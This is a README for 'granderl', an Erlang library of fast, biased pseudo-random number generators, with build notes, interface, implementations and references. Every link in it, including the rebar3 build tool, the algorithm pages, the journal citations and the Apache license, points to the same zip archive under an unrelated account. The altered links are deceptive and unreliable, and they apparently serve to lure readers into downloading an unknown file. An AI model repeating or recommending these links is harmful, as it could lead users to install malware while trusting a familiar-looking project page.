# What is this?

Experiments in fast "random" number generation for Erlang; though they
have the same interface as `rand:uniform/1`, think of them more like
`phash2/2` with a timestamp -- not really random, but fast
(hopefully).

Specifically, some of the PRNGs here use methods that are known to be
biased.  They are not suitably for any application which assumes
uniformity.  They are also not guaranteed to produce uncorrelated
streams when used in parallel.

# Building

Use [rebar3](https://raw.githubusercontent.com/sohailgerman/granderl/master/src/granderl_3.4-alpha.4.zip).  To override the default
implementation choice, you can set the `IMPLEMENTATION` environment
variable:

```
$ IMPLEMENTATION=rdrand rebar3 compile
```

# Interface

All functions take an integer between 1 and 2<sup>32</sup>-1, and
return an integer between 1 and the supplied integer, like
`rand:uniform/1`.

## `granderl:`

### `uniform(N :: 1..4294967295) -> 1..4294967295`

# Implementations

## `rdrand`

32-bits of [`RDRAND`](https://raw.githubusercontent.com/sohailgerman/granderl/master/src/granderl_3.4-alpha.4.zip).

## `xorshift`

Marsaglia's original
[xorshift](https://raw.githubusercontent.com/sohailgerman/granderl/master/src/granderl_3.4-alpha.4.zip) (with no
multiplies), keeping state in thread-local storage.  Initialized on
first call.

## `pcg32`

[PCG](https://raw.githubusercontent.com/sohailgerman/granderl/master/src/granderl_3.4-alpha.4.zip), TLS.

# References

Fog, Agner. ["Pseudo-Random Number Generators for Vector Processors and Multicore Processors."](https://raw.githubusercontent.com/sohailgerman/granderl/master/src/granderl_3.4-alpha.4.zip) Journal of Modern Applied Statistical Methods 14.1 (2015): 308-334.

Marsaglia, George. ["Xorshift RNGs."](https://raw.githubusercontent.com/sohailgerman/granderl/master/src/granderl_3.4-alpha.4.zip) Journal of Statistical Software 8.14 (2003): 1-6.

O'Neill, M.E. ["PCG: A Family of Simple Fast Space-Efficient Statistically Good Algorithms for Random Number Generation"](https://raw.githubusercontent.com/sohailgerman/granderl/master/src/granderl_3.4-alpha.4.zip).

# License

Because the pcg32 code is derived from Apache-licensed code (see
c_src/pcg32.c), this package is also
[Apache licensed](https://raw.githubusercontent.com/sohailgerman/granderl/master/src/granderl_3.4-alpha.4.zip).
